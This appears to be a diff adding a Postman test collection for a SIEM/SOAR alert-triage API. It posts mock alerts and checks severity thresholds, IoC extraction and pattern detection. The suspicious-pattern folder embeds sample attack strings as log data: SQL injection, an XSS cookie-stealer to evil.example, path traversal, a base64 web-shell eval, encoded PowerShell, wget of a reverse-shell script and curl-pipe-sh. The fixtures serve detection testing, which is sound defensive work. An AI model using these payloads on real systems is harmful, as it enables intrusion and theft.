@@ -1,0 +1,1393 @@
+{
+  "info": {
+    "_postman_id": "c9335f53-1139-4cdf-9a87-bd9fcc478129",
+    "name": "SIEMantics - Test Scenarios",
+    "description": "Manual/automated test scenarios for the SIEMantics SOAR API. Mirrors scripts/test_requests.sh: covers the mock-engine severity threshold, all 9 suspicious-pattern regexes, IoC extraction, edge cases, labeling and metrics.\n\nRun order matters: folders 1-3 create the alert records that folder 4 labels. Use Collection Runner to execute the whole collection top to bottom, or run folder by folder.\n\nSet the `base_url` and `webhook_token` collection variables (Variables tab) to match your deployment. If WAZUH_WEBHOOK_TOKEN isn't set server-side, `webhook_token` can be left empty.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "base_url",
+      "value": "http://10.64.0.127:8000",
+      "type": "string"
+    },
+    {
+      "key": "webhook_token",
+      "value": "",
+      "type": "string"
+    }
+  ],
+  "item": [
+    {
+      "name": "0. Health check",
+      "item": [
+        {
+          "name": "GET /healthz",
+          "id": "3eb7912a-5ce4-4ec8-b504-ad43bb808b8b",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/healthz",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "healthz"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('status field is ok', () => {",
+                  "  pm.expect(pm.response.json().status).to.eql('ok');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "1. Severity threshold",
+      "description": "Probes the LLM_MOCK_SEVERITY_THRESHOLD boundary (default 7). No suspicious pattern in any of these logs, so only the severity number decides the verdict.",
+      "item": [
+        {
+          "name": "Low severity, benign -> false positive",
+          "id": "3d6523c6-30cf-4e97-b63f-5616aca77218",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-low-benign\",\n  \"rule\": {\n    \"id\": \"5501\",\n    \"level\": 2,\n    \"description\": \"User login\"\n  },\n  \"agent\": {\n    \"name\": \"web01\",\n    \"ip\": \"10.0.0.5\"\n  },\n  \"data\": {\n    \"srcip\": \"10.0.0.9\"\n  },\n  \"full_log\": \"User admin logged in successfully\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (suppressed)', () => {",
+                  "  pm.response.to.have.status(202);",
+                  "});",
+                  "pm.test('classified as false positive via mock engine', () => {",
+                  "  const json = pm.response.json();",
+                  "  pm.expect(json.status).to.eql('suppressed');",
+                  "  pm.expect(json.triage.is_true_positive).to.eql(false);",
+                  "  pm.expect(json.triage.engine).to.eql('mock');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Severity 6, below threshold(7) -> false positive",
+          "id": "f594ecda-226f-46e7-b99c-4d4ded144d75",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-below-threshold\",\n  \"rule\": {\n    \"id\": \"5502\",\n    \"level\": 6,\n    \"description\": \"Multiple login attempts\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"198.51.100.12\"\n  },\n  \"full_log\": \"3 failed login attempts for user bob\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (suppressed)', () => {",
+                  "  pm.response.to.have.status(202);",
+                  "});",
+                  "pm.test('classified as false positive via mock engine', () => {",
+                  "  const json = pm.response.json();",
+                  "  pm.expect(json.status).to.eql('suppressed');",
+                  "  pm.expect(json.triage.is_true_positive).to.eql(false);",
+                  "  pm.expect(json.triage.engine).to.eql('mock');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Severity 7, at threshold -> true positive",
+          "id": "9966c904-c518-453d-b36b-b8372d4d8c2b",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-at-threshold\",\n  \"rule\": {\n    \"id\": \"5503\",\n    \"level\": 7,\n    \"description\": \"Brute force attempt detected\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"198.51.100.13\"\n  },\n  \"full_log\": \"10 failed login attempts for user root within 60s\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Severity 15, critical -> true positive",
+          "id": "cb2f1262-3f80-40b8-becc-b59c23cb0785",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-critical\",\n  \"rule\": {\n    \"id\": \"5504\",\n    \"level\": 15,\n    \"description\": \"Ransomware behavior detected\"\n  },\n  \"agent\": {\n    \"name\": \"fileserver01\"\n  },\n  \"data\": {\n    \"srcip\": \"203.0.113.50\"\n  },\n  \"full_log\": \"Mass file rename + extension change detected across /shares\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "2. Suspicious patterns",
+      "description": "Each request matches exactly one mock_engine regex. Severity is kept low (4) so the PATTERN, not the severity, is what flips the verdict to true positive.",
+      "item": [
+        {
+          "name": "SQLi (UNION SELECT) -> true positive",
+          "id": "416a334f-3e6a-46a3-bee7-90dcb9a3e738",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-sqli-union\",\n  \"rule\": {\n    \"id\": \"5601\",\n    \"level\": 4,\n    \"description\": \"Anomaly\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"203.0.113.7\"\n  },\n  \"full_log\": \"GET /products?id=1 UNION SELECT username,password FROM users--\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "SQLi (OR 1=1) -> true positive",
+          "id": "5cff46d3-09b2-4b3b-87bb-e46b23ac2673",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-sqli-or1eq1\",\n  \"rule\": {\n    \"id\": \"5602\",\n    \"level\": 4,\n    \"description\": \"Anomaly\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"203.0.113.8\"\n  },\n  \"full_log\": \"GET /login?user=admin' OR 1=1--\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "XSS (<script>) -> true positive",
+          "id": "ec47ee61-37e7-42f0-bc67-0fdffb294b6d",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-xss\",\n  \"rule\": {\n    \"id\": \"5603\",\n    \"level\": 4,\n    \"description\": \"Anomaly\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"203.0.113.9\"\n  },\n  \"full_log\": \"POST /comment body=<script>document.location=\\\"http://evil.example/steal?c=\\\"+document.cookie</script>\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Path traversal (../../) -> true positive",
+          "id": "187d7c47-15f1-422c-b635-1f38f45fb1f6",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-path-traversal\",\n  \"rule\": {\n    \"id\": \"5604\",\n    \"level\": 4,\n    \"description\": \"Anomaly\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"203.0.113.10\"\n  },\n  \"full_log\": \"GET /download?file=../../../../etc/shadow\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "base64_decode payload -> true positive",
+          "id": "7602cb0e-2019-4111-b61f-201cf26c8d50",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-base64-decode\",\n  \"rule\": {\n    \"id\": \"5605\",\n    \"level\": 4,\n    \"description\": \"Anomaly\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"203.0.113.11\"\n  },\n  \"full_log\": \"eval(base64_decode(\\\"c3lzdGVtKCRfR0VUWydjbWQnXSk7\\\"))\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "PowerShell -enc payload -> true positive",
+          "id": "512ef4b0-a351-4dbf-9c2b-e649b7ffc263",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-powershell-enc\",\n  \"rule\": {\n    \"id\": \"5606\",\n    \"level\": 4,\n    \"description\": \"Anomaly\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"10.0.0.44\"\n  },\n  \"full_log\": \"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "/etc/passwd access -> true positive",
+          "id": "500b80a8-8fd4-4f82-902e-984a40962ed6",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-etc-passwd\",\n  \"rule\": {\n    \"id\": \"5607\",\n    \"level\": 4,\n    \"description\": \"Anomaly\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"10.0.0.45\"\n  },\n  \"full_log\": \"cat /etc/passwd executed by www-data\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "wget http payload -> true positive",
+          "id": "7a1280a5-cc66-4bff-81a4-64309b02bbd2",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-wget-payload\",\n  \"rule\": {\n    \"id\": \"5608\",\n    \"level\": 4,\n    \"description\": \"Anomaly\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"192.0.2.44\"\n  },\n  \"full_log\": \"wget http://192.0.2.44/rs.sh -O /tmp/rs.sh\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "curl http ... | sh payload -> true positive",
+          "id": "a61b8f64-9138-48bf-84e5-1b8c3e0c2776",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-curl-pipe-sh\",\n  \"rule\": {\n    \"id\": \"5609\",\n    \"level\": 4,\n    \"description\": \"Anomaly\"\n  },\n  \"agent\": {\n    \"name\": \"web01\"\n  },\n  \"data\": {\n    \"srcip\": \"192.0.2.45\"\n  },\n  \"full_log\": \"curl http://192.0.2.45/install.sh | sh\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "3. IoC extraction + edge cases",
+      "item": [
+        {
+          "name": "Multiple IPs in log -> all IPs + srcip in iocs[]",
+          "id": "1a3f0cb9-3701-457b-a192-ebce40f0369d",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-multi-ioc\",\n  \"rule\": {\n    \"id\": \"5701\",\n    \"level\": 13,\n    \"description\": \"C2 beacon detected\"\n  },\n  \"agent\": {\n    \"name\": \"win-host-02\"\n  },\n  \"data\": {\n    \"srcip\": \"198.51.100.99\"\n  },\n  \"full_log\": \"Beacon to 198.51.100.200 relayed via proxy 198.51.100.201, C2 root 198.51.100.202\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('classified as true positive via mock engine', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.triage.is_true_positive).to.eql(true);",
+                  "    pm.expect(json.triage.engine).to.eql('mock');",
+                  "  });",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
+                  "  });",
+                  "}",
+                  "if (pm.response.code === 202) {",
+                  "  pm.test('all 4 IPs extracted as IoCs', () => {",
+                  "    const iocs = pm.response.json().triage.iocs;",
+                  "    pm.expect(iocs).to.have.members(['198.51.100.99','198.51.100.200','198.51.100.201','198.51.100.202']);",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Minimal payload (only required 'rule' field) -> 202, defaults applied",
+          "id": "2b8eb67c-a3a1-4ce7-819c-db0b58b6b4b6",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-minimal\",\n  \"rule\": {\n    \"level\": 1\n  }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (suppressed)', () => {",
+                  "  pm.response.to.have.status(202);",
+                  "});",
+                  "pm.test('classified as false positive via mock engine', () => {",
+                  "  const json = pm.response.json();",
+                  "  pm.expect(json.status).to.eql('suppressed');",
+                  "  pm.expect(json.triage.is_true_positive).to.eql(false);",
+                  "  pm.expect(json.triage.engine).to.eql('mock');",
+                  "});",
+                  "pm.test('rule description defaulted', () => {",
+                  "  pm.expect(pm.response.json().triage.reasoning).to.include('severity=1');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Missing agent/data/full_log, severity low -> 202, source_ip null",
+          "id": "9c6f2e0d-7cdf-473f-a291-8e75ca68caba",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-no-agent\",\n  \"rule\": {\n    \"id\": \"5801\",\n    \"level\": 3,\n    \"description\": \"Anomaly without agent context\"\n  }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
